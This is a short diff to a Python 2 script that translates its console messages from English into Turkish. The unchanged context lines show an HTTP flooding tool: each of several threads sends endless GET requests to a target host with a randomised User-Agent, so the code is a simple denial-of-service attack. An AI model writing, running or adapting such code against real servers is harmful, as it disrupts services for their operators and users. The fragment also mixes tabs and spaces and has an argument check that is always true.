@@ -15,13 +15,13 @@ user_agent = [
 def run():
 	if len(sys.argv)>=1:
 		url="http://"+host
-		print "Attacking",host 
+		print "Saldırılıyor",host 
         while True:
 			headers={'User-Agent': random.choice(user_agent)}
 			r = requests.get(url,headers=headers)
 			
 	else:
-		print "It only work on HTTP server!!!"
+		print "Sadece HTTP Sunucusunda Çalışır !!!"
 
 for i in range(thread_num):
     th = threading.Thread(target = run)
